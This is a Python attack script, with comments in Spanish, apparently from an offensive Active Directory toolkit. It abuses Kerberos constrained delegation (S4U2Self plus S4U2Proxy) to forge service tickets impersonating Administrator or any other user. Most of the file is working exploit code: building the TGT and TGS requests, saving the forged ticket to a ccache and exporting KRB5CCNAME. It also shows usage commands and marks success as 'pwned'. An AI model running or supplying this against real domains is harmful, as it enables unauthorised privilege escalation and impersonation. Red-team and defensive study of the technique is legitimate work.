# scripts/kerberos/delegation/constrained_s4u.py
#
# Técnica: Delegación Restringida (Constrained Delegation) — abuso S4U2Proxy
#
# Fundamento:
#   La delegación restringida limita a qué servicios puede delegar un servicio.
#   El atributo msDS-AllowedToDelegateTo lista los SPNs destino.
#
#   El mecanismo S4U (Service for User) tiene dos partes:
#     S4U2Self: el servicio obtiene un ST para sí mismo impersonando a un usuario.
#     S4U2Proxy: el servicio usa ese ST (+ su TGT) para obtener un ST para otro
#                servicio, impersonando al mismo usuario.
#
#   Si comprometemos la cuenta con msDS-AllowedToDelegateTo, podemos:
#     1. S4U2Self → ST como cualquier usuario (incluso Domain Admin) para nuestra cuenta.
#     2. S4U2Proxy → ST como ese usuario para el servicio en msDS-AllowedToDelegateTo.
#     3. Usar ese ST para acceder al servicio destino como Domain Admin.
#
#   Condición adicional: la cuenta debe tener TRUSTED_TO_AUTH_FOR_DELEGATION
#   (ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, bit 0x1000000) para que
#   S4U2Self funcione para usuarios no autenticados. Si no, solo funciona
#   si el usuario se autenticó primero (protocolo transition limitado).

from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_pa_data, build_enc_timestamp,
    build_s4u2self_tgs_req, build_tgs_req,
    is_as_rep, is_tgs_rep, is_krb_error, parse_krb_error,
    parse_as_rep_ticket, decrypt_as_rep_enc_part_rc4,
    nt_hash as compute_nt_hash,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP,
)
from core.output import print_result, print_table, console
from core import session_db


class ConstrainedS4UScript(BaseScript):
    name = "constrained-s4u"
    description = "Abusa S4U2Self+S4U2Proxy en cuentas con msDS-AllowedToDelegateTo para impersonar"

    examples = [
        {"flag": "--target-user",
         "desc": "Usuario a impersonar en el servicio destino (ej. Administrator)",
         "good": "kerberos --script=constrained-s4u -t 10.129.1.5 -d CORP.LOCAL -u svc_account -p 'Svc123!' --target-user Administrator --spn cifs/SRV01.corp.local",
         "bad": "kerberos --script=constrained-s4u ... --target-user krbtgt  [krbtgt no es un usuario que acceda a servicios normales]"},
        {"flag": "--spn",
         "desc": "SPN destino (debe estar en msDS-AllowedToDelegateTo de la cuenta comprometida)",
         "good": "kerberos --script=constrained-s4u ... --spn cifs/SRV01.corp.local",
         "bad": "kerberos --script=constrained-s4u ... --spn cifs/SRV99.corp.local  [si SRV99 no está en msDS-AllowedToDelegateTo, el KDC rechazará el S4U2Proxy]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        target_user = kwargs.get("target_user") or "Administrator"
        spn = kwargs.get("spn")

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not self.creds.user: console.print("[red]Falta -u (cuenta con delegación).[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return

        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", "KDC no alcanzable"); return

        user_nt = (bytes.fromhex(self.creds.hash.split(":")[-1])
                   if self.creds.hash else compute_nt_hash(self.creds.password))

        if not spn:
            # Si no se da SPN, enumerar los disponibles via LDAP
            print_result("KRB", kdc, "info",
                         "Sin --spn especificado — enumerando msDS-AllowedToDelegateTo via LDAP")
            spns = self._get_delegation_targets(kdc, realm)
            if not spns:
                console.print("[red]No se encontraron SPNs de delegación. "
                               "Usa --spn para especificar uno.[/red]")
                return
            spn = spns[0]
            console.print(f"[dim]Usando primer SPN disponible: {spn}[/dim]")

        print_result("KRB", kdc, "info",
                     f"constrained-s4u: {self.creds.user} → S4U2Self({target_user}) → S4U2Proxy({spn})")

        # Paso 1: TGT de la cuenta con delegación
        ts_enc = build_enc_timestamp(self.creds.password or "")
        pa_list = [build_pa_data(PA_ENC_TIMESTAMP, ts_enc)]
        req = build_as_req(self.creds.user, realm, etypes=[ETYPE_RC4_HMAC], pa_data_list=pa_list)
        try:
            tgt_resp = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_as_rep(tgt_resp):
            print_result("KRB", kdc, "fail", "No se obtuvo TGT"); return

        enc_info = decrypt_as_rep_enc_part_rc4(tgt_resp, user_nt)
        session_key = enc_info['session_key']
        tgt_raw = parse_as_rep_ticket(tgt_resp)['ticket_raw']

        print_result("KRB", kdc, "ok", f"TGT obtenido para {self.creds.user}@{realm}")

        # Paso 2: S4U2Self
        s4u_req = build_s4u2self_tgs_req(
            realm=realm, tgt_bytes=tgt_raw, session_key=session_key,
            requester_user=self.creds.user, target_user=target_user,
        )
        try:
            s4u_resp = send_krb_message(kdc, s4u_req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_tgs_rep(s4u_resp):
            if is_krb_error(s4u_resp):
                err = parse_krb_error(s4u_resp)
                print_result("KRB", kdc, "fail", f"S4U2Self falló: {err['error_name']}")
            return

        print_result("KRB", kdc, "ok",
                     f"S4U2Self OK → ST como {target_user} para nuestra cuenta")

        # Paso 3: S4U2Proxy — usar el ST de S4U2Self para obtener ST para el SPN destino
        # El TGS-REQ de S4U2Proxy incluye el ST de S4U2Self como additional-ticket [11]
        # y la extensión S4U2Proxy en las KDC options.
        spn_parts = spn.split("/", 1)
        if len(spn_parts) != 2:
            console.print(f"[red]SPN inválido: {spn}[/red]"); return

        # Extraer el ticket del TGS-REP de S4U2Self para usarlo como additional-ticket
        s4u_ticket = parse_as_rep_ticket(s4u_resp)['ticket_raw']

        proxy_req = self._build_s4u2proxy_req(
            realm, tgt_raw, s4u_ticket, session_key,
            spn_parts[0], spn_parts[1], self.creds.user
        )
        try:
            proxy_resp = send_krb_message(kdc, proxy_req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_tgs_rep(proxy_resp):
            if is_krb_error(proxy_resp):
                err = parse_krb_error(proxy_resp)
                print_result("KRB", kdc, "fail",
                             f"S4U2Proxy falló: {err['error_name']} — "
                             f"¿{spn} está en msDS-AllowedToDelegateTo?")
            return

        print_result("KRB", kdc, "pwned",
                     f"S4U2Proxy OK → ST para {target_user}@{realm} → {spn}")

        # Guardar como .ccache
        ccache_path = self._save_tgs_ccache(proxy_resp, realm, target_user, spn)
        if ccache_path:
            import os
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            console.print(f"[green]ST guardado: {ccache_path}[/green]")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            session_db.save_finding(kdc, "KRB", "s4u_abuse",
                                     f"{self.creds.user}→S4U2Self({target_user})→S4U2Proxy({spn})")

    def _build_s4u2proxy_req(self, realm, tgt_bytes, s4u_st_bytes, session_key,
                              srv, host, requester) -> bytes:
        """
        TGS-REQ con extensión S4U2Proxy:
        - KDC options: CNAME_IN_ADDL_TKT + FORWARDABLE
        - additional-tickets [11]: el ST de S4U2Self
        El KDC valida que el servicio tiene derecho a delegar a este SPN.
        """
        from core.asn1_helpers import (
            der_sequence, der_sequence_of, der_integer, der_general_string,
            der_generalized_time, der_bit_string, ctx_primitive, ctx_constructed,
            build_principal_name, build_pa_data, application_tag, random_nonce,
            rc4_hmac_encrypt, PVNO, KRB_TGS_REQ, KRB_AP_REQ, PA_TGS_REQ,
            KDC_OPT_FORWARDABLE, ETYPE_RC4_HMAC,
        )
        from datetime import datetime, timezone, timedelta

        now = datetime.now(timezone.utc)
        realm_upper = realm.upper()

        # KDC_OPT_CNAME_IN_ADDL_TKT (bit 14) + FORWARDABLE
        CNAME_IN_ADDL_TKT = 0x00020000
        opts = KDC_OPT_FORWARDABLE | CNAME_IN_ADDL_TKT

        # Authenticator
        auth_body = der_sequence([
            ctx_primitive(0, der_integer(PVNO)),
            ctx_primitive(1, der_general_string(realm_upper)),
            ctx_constructed(2, build_principal_name(1, requester)),
            ctx_primitive(4, der_integer(now.microsecond)),
            ctx_primitive(5, der_generalized_time(now)),
        ])
        authenticator_raw = application_tag(2, auth_body)
        enc_auth = rc4_hmac_encrypt(session_key, authenticator_raw, key_usage=7)
        enc_auth_der = der_sequence([
            ctx_primitive(0, der_integer(ETYPE_RC4_HMAC)),
            ctx_primitive(2, der_sequence([b'\x04'] + list([enc_auth]))),
        ])
        ap_req_body = der_sequence([
            ctx_primitive(0, der_integer(PVNO)),
            ctx_primitive(1, der_integer(KRB_AP_REQ)),
            ctx_primitive(2, der_bit_string(0)),
            ctx_constructed(3, tgt_bytes),
            ctx_constructed(4, enc_auth_der),
        ])
        ap_req = application_tag(KRB_AP_REQ, ap_req_body)
        pa_tgs = build_pa_data(PA_TGS_REQ, ap_req)

        till = datetime.now(timezone.utc) + timedelta(days=1)
        req_body_fields = [
            ctx_primitive(0, der_bit_string(opts)),
            ctx_primitive(2, der_general_string(realm_upper)),
            ctx_constructed(3, build_principal_name(2, srv, host)),
            ctx_primitive(5, der_generalized_time(till)),
            ctx_primitive(7, der_integer(random_nonce())),
            ctx_constructed(8, der_sequence_of([der_integer(ETYPE_RC4_HMAC)])),
            # additional-tickets [11]: el ST de S4U2Self
            ctx_constructed(11, der_sequence_of([s4u_st_bytes])),
        ]
        req_body = der_sequence(req_body_fields)
        req_fields = [
            ctx_primitive(1, der_integer(PVNO)),
            ctx_primitive(2, der_integer(KRB_TGS_REQ)),
            ctx_constructed(3, der_sequence_of([pa_tgs])),
            ctx_constructed(4, req_body),
        ]
        return application_tag(KRB_TGS_REQ, der_sequence(req_fields))

    def _get_delegation_targets(self, kdc, realm):
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.get_constrained_delegation_targets(self.creds.user)
        except (ImportError, Exception):
            return []

    def _save_tgs_ccache(self, tgs_resp, realm, username, spn) -> str | None:
        try:
            from impacket.krb5.ccache import CCache
            ccache = CCache()
            ccache.fromTGS(tgs_resp, realm, username, realm, spn, b'\x00' * 16)
            out = f"/tmp/s4u2proxy_{username}_{spn.replace('/', '_')}.ccache"
            ccache.saveFile(out)
            return out
        except Exception:
            return None
